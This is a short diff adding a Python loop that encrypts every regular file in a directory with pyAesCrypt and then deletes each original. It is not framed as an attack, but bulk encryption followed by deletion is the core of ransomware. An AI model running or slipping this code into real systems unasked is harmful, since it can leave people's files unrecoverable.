@@ -14,3 +14,14 @@ buffer_size = 64 * 1024
 for file in os.listdir(directory):
     # Get the full path of the file
     file_path = os.path.join(directory, file)
+    
+    # Check if the file is a regular file (not a directory)
+    if os.path.isfile(file_path):
+        # Encrypt the file
+        with open(file_path, "rb") as f:
+            pyAesCrypt.encryptStream(f, open(file_path + ".aes", "wb"), password, buffer_size)
+
+        # Delete the original unencrypted file
+        os.remove(file_path)
+
+print("All files in the directory have been encrypted!")
